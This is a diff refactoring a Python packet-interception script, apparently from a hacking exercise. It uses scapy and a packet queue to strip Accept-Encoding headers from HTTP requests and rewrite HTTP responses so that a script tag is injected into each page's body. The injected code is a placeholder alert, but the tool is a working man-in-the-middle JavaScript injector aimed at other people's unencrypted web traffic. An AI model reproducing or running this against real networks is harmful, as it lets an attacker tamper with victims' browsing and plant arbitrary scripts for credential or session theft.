@@ -15,21 +15,25 @@ def loader(packet, load):
 def spoofed_packet(packets):
     scapy_packet = scapy.IP(packets.get_payload()) # converting packet to scapy packet i.e. IP layer
     if scapy_packet.haslayer(scapy.Raw):
+        scapy_loader = scapy_packet[scapy.Raw].load
         # Destination Port
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
             # Removing Accept-Encoding in the request using regex rules.
             # The old packet will be returned as a string
             # Thus it will decode the response into HTML code
-            old_packet = regex.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_packet = loader(scapy_packet, old_packet)
-            packets.set_payload(str(new_packet)) # change payload of the packet that we will accept to the new payload
+            scapy_loader = regex.sub("Accept-Encoding:.*?\\r\\n", "", scapy_loader)
+
         # Source Port
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
             # Injecting HTML/JavaScript Code in the response field aka the html code of the website
-            loader_modifier = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</script></body>")
-            new_packet = loader(scapy_packet, loader_modifier)
+            scapy_loader = scapy_loader.replace("</body>", "<script>alert('test');</script></body>")
+
+        # Refactoring
+        # Checking if scapy_loader is not equal to the raw layer of the scapy packet then execute the code
+        if scapy_loader != scapy_packet[scapy.Raw].load:
+            new_packet = loader(scapy_packet, scapy_loader)
             packets.set_payload(str(new_packet))
     packets.accept()  # accept packets
 
